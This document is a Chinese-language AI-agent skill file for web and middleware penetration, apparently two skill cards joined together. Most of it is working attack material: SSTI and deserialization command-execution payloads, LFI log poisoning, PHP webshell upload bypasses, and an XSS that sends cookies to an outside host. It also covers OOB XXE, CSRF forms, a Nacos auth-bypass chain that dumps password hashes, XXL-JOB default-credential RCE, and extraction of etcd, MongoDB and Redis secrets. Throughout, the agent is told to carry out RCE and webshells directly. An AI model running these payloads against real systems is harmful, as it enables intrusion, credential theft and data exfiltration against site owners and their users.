---
name: core-web-vuln-kit
description: >-
 授权站通用 Web 核心面：XXE、SSTI、LFI/上传、XSS、CSRF/CORS、PHP 反序列化、
 密码重置、Werkzeug/Django DEBUG。无专用栈或只扫了目录/JWT 时使用。用户提到 XXE、SSTI、模板注入、
 文件包含、php://filter、CORS 凭证、CSRF、反序列化 Cookie、忘记密码、Werkzeug、Django DEBUG 时使用。
 假支付/Actuator/FastAdmin/Jeecg 仍走专卡。
---

# 核心 Web 漏洞面（Cursor Skill）

## 何时用

- 目标是业务站/API，没有 Java/PHP 专卡命中（侦察后先 `strike_probe`，再本卡）
- 用户点名 XXE / SSTI / LFI / 上传 / CSRF / CORS / 重置
- `kit_run --kit web` 后仍缺「漏洞面」格子

## 真源

1. `docs/playbooks/核心Web漏洞面作业手法.md`
2. `docs/playbooks/PHP反序列化作业手法.md`
3. `python3 tools/ops/core_web_surface_probe.py -u https://授权站 --case <案卷>`
 套装里用 `--fast`（少参数，防拖死 kit_run）
4. 单点注入面：`python3 tools/ops/tpl_inject_probe.py ssti|lfi|xxe|cmdi`

细卡（先探针再打开）：

| 面 | 走 |
|----|-----|
| SSTI | `tpl_inject_probe.py ssti` · `测绘引擎SSTI作业手法.md` |
| LFI/RFI | `tpl_inject_probe.py lfi` · `测绘引擎LFI作业手法.md` |
| XXE | `tpl_inject_probe.py xxe` · `测绘引擎XXE作业手法.md` |
| 命令注入 | `tpl_inject_probe.py cmdi` · `测绘引擎命令注入作业手法.md` |
| CORS | `cors_csrf_probe.py cors` · `测绘引擎CORS作业手法.md` |
| CSRF | `cors_csrf_probe.py csrf` · `测绘引擎CSRF作业手法.md` |
| JWT | `jwt_forge_probe.py` · `测绘引擎JWT作业手法.md` |
| GraphQL | `gql_authz_probe.py` · `测绘引擎GraphQL作业手法.md` |
| 竞态 | `race_probe.py` · `测绘引擎竞态作业手法.md` |
| 上传 | `file-upload-webshell`（先 marker） |
| XSS | `xss-exploit` · `stored_xss_probe.py` |
| 重置/ATO | `account-takeover-chain` |
| Werkzeug / Django DEBUG | 探针 L1 → `ssti-exploit` PIN；PHP Ignition 仍走 `php-debug-mode-exploitation` |
| 竞态 | `race-condition` · `logic_vuln_probe.py` |
| Java 反序列化 | Shiro / Fastjson 专卡，不走 PHP 卡 |

## 强制

1. 目标在 scope。
2. 先跑探针，按 `surface.json` 交接，禁止只贴 payload 百科结案。
3. L2 文件读/算术差分即可验证；RCE/WebShell 授权内直接做。
4. 有身份 → 回对象矩阵。

---

## SSTI 快速确认 payload（先用无害差分）

```
# 通用探测（无害，看 9359，不要用页面里的 49）
{{1337*7}} → 9359 (Jinja2/Twig)
${1337*7} → 9359 (Freemarker/Velocity)
<%= 7*7 %> → 49 (ERB/JSP)
#{7*7} → 49 (Ruby Haml)
*{7*7} → 49 (Spring SpEL)

# Jinja2（Python Flask/Django）确认+命令执行
{{config}} # 泄露配置（安全，先做）
{{request.environ}} # 环境变量
{{''.__class__.__mro__[1].__subclasses__()}} # 拿子类
# 找 subprocess.Popen 的索引（通常250-400之间）
{{''.__class__.__mro__[1].__subclasses__()[XXX](['id'],stdout=-1).communicate()}}

# Freemarker（Java）
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Velocity（Java）
#set($e="")
$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# Twig（PHP）
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## LFI / 路径穿越快查

```bash
# 基础路径穿越（Linux）
../../../../etc/passwd
..%2F..%2F..%2F..%2Fetc%2Fpasswd # URL编码 /
..%252F..%252F..%252Fetc%252Fpasswd # 双重URL编码
....//....//....//etc/passwd # 双斜杠绕过

# 常见目标文件
/etc/passwd # 确认LFI
/etc/shadow # 密码哈希（需root）
/proc/self/environ # 包含HTTP_HOST等，可触发RCE
/proc/self/fd/X # X=0-20，日志文件描述符
/var/log/apache2/access.log # Apache日志（日志投毒）
/var/log/nginx/access.log # Nginx日志
/var/log/auth.log # SSH日志（投毒用户名字段）

# PHP协议包装（php://filter → 无RCE也能读源码）
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=config.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# data://（需allow_url_include=On）
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# 日志投毒链（GET /<?php system($_GET['c']); ?> → 然后LFI包含日志）
curl 'https://授权站/' -H "User-Agent: <?php system(\$_GET['c']); ?>"
curl 'https://授权站/index.php?page=../../../var/log/nginx/access.log&c=id'
```

---

## 文件上传绕过快查

```
# MIME绕过（Content-Type改为image/jpeg但内容是PHP）
Content-Type: image/jpeg
文件内容: <?php @eval($_POST['c']); ?>

# 双扩展名（Apache解析从右往左）
shell.php.jpg → 如果.jpg未配置，回落到.php
shell.jpg.php → 直接解析

# 大小写（Windows/IIS不区分大小写）
shell.PhP
shell.PHP5 / .phtml / .phar

# 空格/点（Windows）
shell.php. → Windows自动去掉末尾点
shell.php%20 → 末尾空格

# .htaccess覆盖（如果允许上传.htaccess）
AddType application/x-httpd-php .jpg → 之后.jpg都当PHP执行

# SVG XSS（Content-Type验证但不验内容）
<svg xmlns="http://www.w3.org/2000/svg">
 <script>fetch('https://hook.example.com?c='+document.cookie)</script>
</svg>

# 验证 Content-Type + 扩展名，魔数绕过（GIF89a前缀）
GIF89a <?php system($_GET['c']); ?>
```

---

## CORS 配置错误快查

```bash
# 检测：发带 Origin 的请求
curl -H "Origin: https://evil.com" -I https://授权站/api/user

# 漏洞信号
Access-Control-Allow-Origin: https://evil.com # 直接反射
Access-Control-Allow-Origin: * # 通配（仅无需凭证时危险）
Access-Control-Allow-Credentials: true # 带 Cookie → 高危

# 常见绕过
Origin: null # 沙盒iframe
Origin: https://target.com.evil.com # 前缀正则匹配漏洞
Origin: https://eviltarget.com # 后缀正则漏洞
```

---

## XXE 快查

```xml
<!-- 基础 XXE（读文件）-->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- OOB XXE（带外，无回显时）-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://攻击机:8888/xxe?d=...">]>

<!-- XXE via SVG/XLSX/DOCX（文件解析接口）-->
# 在 SVG 里嵌入 DOCTYPE：
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>

# 测试接口：上传功能 / XML解析API / SOAP接口 / 报表生成
Content-Type: application/xml
Content-Type: text/xml
```

---

## CSRF 快查

```html
<!-- 基础 CSRF（GET）-->
<img src="https://授权站/api/transfer?to=attacker&amount=1000">

<!-- POST CSRF（隐藏表单自提交）-->
<html><body onload="document.forms[0].submit()">
<form action="https://授权站/api/change-email" method="POST">
 <input name="email" value="attacker@evil.com">
</form></body></html>

<!-- JSON CSRF（Content-Type text/plain 绕过）-->
<form action="https://授权站/api/action" method="POST" enctype="text/plain">
 <input name='{"action":"delete","id":1,"x":"' value='"}'>
</form>

# 检测：请求是否带 CSRF token / SameSite Cookie / Referer检查
# 无 CSRF token + Cookie未设SameSite + Referer未校验 = 漏洞
```

---

## PHP 反序列化快查

```bash
# 常用工具
# ysoserial（Java）: java -jar ysoserial.jar CommonsCollections6 'id' | base64
# phpggc（PHP）: 
phpggc Laravel/RCE1 'system("id")' | base64 # Laravel APP_KEY+反序列化RCE
phpggc Monolog/RCE1 'system("id")' # Monolog
phpggc Guzzle/FW1 /var/www/html/shell.php 'id' # 文件写入

# Shiro 反序列化（AES-128-CBC，需要正确的 rememberMe key）
python3 tools/ops/java_web_surface_probe.py --shiro https://授权站 --case <案卷>

# Cookie 反序列化（PHP）
# 信号：Cookie 值是 base64 编码的序列化对象 O:4:"User":1:{...}
# 手法：修改序列化对象的属性触发 __wakeup/__destruct
```

---

<!-- 补充视角: middleware-unauth-family (兄弟技能库 2026-09-12) -->

---
name: middleware-unauth-family
description: "中间件未授权渗透时使用。触发: Nacos, XXL-JOB, Doris, etcd, MongoDB。"
version: 1.0.0
license: MIT
metadata:
    related_skills: [java-framework-deserialization-family, heapdump-credential-hunter, surveyengine-knowledge-pack]
---

# 中间件未授权渗透家族 (Middleware Unauth Family)

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收。覆盖 Nacos 3.x / XXL-JOB / Doris / etcd / MongoDB / ES / Memcached / Redis 未授权与利用链。完整卡在镜像 `.cursor\skills\<name>\SKILL.md`。

## Nacos 3.x 鉴权作用域错配(3.0.0~3.2.3,修 3.2.4)
**原理**: UserV3/RoleV3/PermissionV3 控制器漏写 `apiType`,即使 `admin.enabled`/`console.enabled` 全开,`/nacos/v3/auth/*` 仍不鉴权。
```bash
# 无损探测: GET /nacos/v3/auth/user/list 无 token 返 200 + {"code":0,"data":{"pageItems":[...]}} = 阳性
# 完整链(默认自动清理): 建号→绑角色→发 *:* 权限→登录→列配置→写 marker
curl -s "http://<IP>:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=100"   # 拖用户名+bcrypt hash
# 以 token 列配置
curl -s "http://<IP>:8848/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=100" -H "accessToken: $TOKEN"
# 写 marker(禁止覆盖生产配置): POST /nacos/v3/admin/cs/config dataId=pentest-marker.txt ...
```
- **不要**: 绑定 ROLE_ADMIN(服务端拦截+告警)/覆盖删除生产配置/改 admin 密码
- 拿到配置 `ENC(...)` → Jasypt 解密 → spring-actuator 链;DB/Redis 凭据 → 回灌业务

## XXL-JOB 管理台(admin/123456)
```bash
# 四刀: 认口(/xxl-job-admin/ :8080 :9997; 执行器 :9999 /run) → 进后台 → 列执行器(jobgroup/pageList) → GLUE
# 登录成功看: XXL_JOB_LOGIN_IDENTITY cookie 或 302 /index 或 JSON code:200(三态都算,老模板只认 JSON 会漏)
# GLUE: jobinfo/add + glueType=GLUE_SHELL + trigger = RCE,授权内直接做
```
- 弱口令: `admin/123456` → `admin/admin` `xxljob/123456`
- L3 后不停在 id → 后渗透链(JAR→YML→JDBC→Redis→JWT→云凭据)

## Apache Doris / StarRocks 三板斧(StarRocks 同口当兄弟栈)
- 斧1: `9030` FE MySQL 协议 **root/admin 空口令** → `SHOW DATABASES`
- 斧2: `8030` HTTP 无鉴权或 Basic `root:` → Doris `/api/query`;StarRocks `/api/v1/catalogs/.../sql`;顺带 8040 BE
- 斧3: 应用 SQLi 或已有 SQL 面 → information_schema 摸业务表;**OUTFILE/甩马授权内直接做**
- `<3.1.0` FE 管理 REST 对上 **CVE-2026-58319**

## etcd(2379 客户端;2380 是 peer 别当业务口)
```bash
curl http://IP:2379/version | curl http://IP:2379/health    # L1 裸奔
curl "http://IP:2379/v2/keys/?recursive=true"                # v2 老集群全量
# v3 range / Watch(CVE-2026-73499 越权读) → 抽 kubernetes.io secret/DB串/云AK
```
- **禁止**复现 CVE-2026-73500 TLS 洪水;双 401 = 已开鉴权,换证书/SA,不要报未授权

## MongoDB / ES / Memcached / Redis
```bash
# MongoDB 27017: pymongo 连上不弹密码 = 未授权;优先集合 users/payment/orders/admin/operator
python3 -c "import pymongo; c=pymongo.MongoClient('<IP>',27017,serverSelectionTimeoutMS=5000); print(c.list_database_names())"
# Elasticsearch 9200: curl 返 cluster_name/version JSON
# Memcached 11211: echo "stats" | nc <IP> 11211 → STAT pid
- Redis 6379: 读 captcha、主从写文件授权内直接做;flush_all/_delete/删索引先问

## PikiwiDB / Pika(v3.5.7,CVE-2026-84700,CVSS 8.6)— Redis 系兼容库隐藏复制口
- **关键指纹**: 内网/外网扫到 Redis 兼容端口(默认 9221,非 6379)时,`端口+2000` 常开内部 protobuf 复制服务(9221→11221),**不鉴权**即可连
- 原理: frame dispatcher(DealMessage)不要求先 MetaSync 成功就路由其他消息;requirepass 只在 HandleMetaSyncRequest 校验 → 未认证可发复制/数据面消息
- 探测: `nc <IP> 11221` 发 protobuf 帧;nuclei/手动指纹看 banner `Pika`
- 归属: PikiwiDB(Pika v3.x 是 360/OpenAtom 开源 Redis 替代,业务常当 Redis 用)→ 打到的复制面当 Redis 面打(读键/拖配置),授权内直接做
- 参考: vulncheck advisory / https://github.com/OpenAtomFoundation/pikiwidb/issues/3270
```
- FOFA 情报: MongoDB `port="27017"`;ES `port="9200" && title="elasticsearch"`;Memcached `port="11211"`

## 纪律
- SSRF 打到的内网 IP **先扩权**再打
- 默认跑满 L2,不只扫端口结案;证据打码不拖全库
- 写完即清: Nacos 默认自动删账号;S3/写盘测完 DELETE

## 完整情报
镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\middleware-unauth\SKILL.md`(270行) + nacos/xxljob/doris/etcd 各专卡
